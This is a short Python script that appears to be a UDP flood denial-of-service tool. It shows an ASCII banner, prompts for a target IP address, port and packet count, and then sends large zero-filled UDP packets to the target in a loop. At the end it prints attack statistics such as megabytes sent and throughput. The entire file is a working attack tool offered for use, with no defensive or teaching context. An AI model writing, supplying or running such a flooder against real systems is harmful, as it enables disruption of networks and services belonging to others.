import random
import socket
import time
bsize = 0

print("""
  _ ____   ___    __  
 (_)___ \ / _ \  / /  
  _  __) | (_) |/ /_  
 | ||__ < > _ <| '_ \ 
 | |___) | (_) | (_) |
 |_|____/ \___/ \___/

""")

def dos(target, port, reqamount):
    byte = random.randint(1000, 20000)
    global bsize
    bsize = byte
    print(f'Autogenerated packet size is {byte} bytes.')
    byte = bytes(byte)
    reqs = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print('[!]Attack in progress...')
    while reqs < reqamount:
        try:
            s.sendto(byte, (target, port))
        except:
            print('Exception occured at loop > ' + str(reqs))
            break
        else:
            reqs += 1
            continue

t = input('Enter target (defaults to 192.168.0.1) > ')
if len(t) == 0:
    t = '192.168.0.1'

p = input('Enter port (defaults to 80) > ')
if len(p) == 0:
    p = 80
else:
    p = int(p)

r = input('Enter amount of requests (defaults to 100) > ')
if len(r) == 0:
    r = 100
else:
    r = int(r)

#calculate attack stats
start = time.time()
dos(t, p, r)
finish = time.time()
elapsed = round(finish - start, 2)
total = round((bsize*r)/1000000, 2)
mbs =  round(total / elapsed, 2)

print('-' * 60)
print('Attack finished!')
print(f'[+]Total MB worth of packets sent: {total}')
print(f'[+]Time elapsed: {elapsed} seconds.')
print(f'[+]Average speed is {mbs}MB per second.')
print('-' * 60)
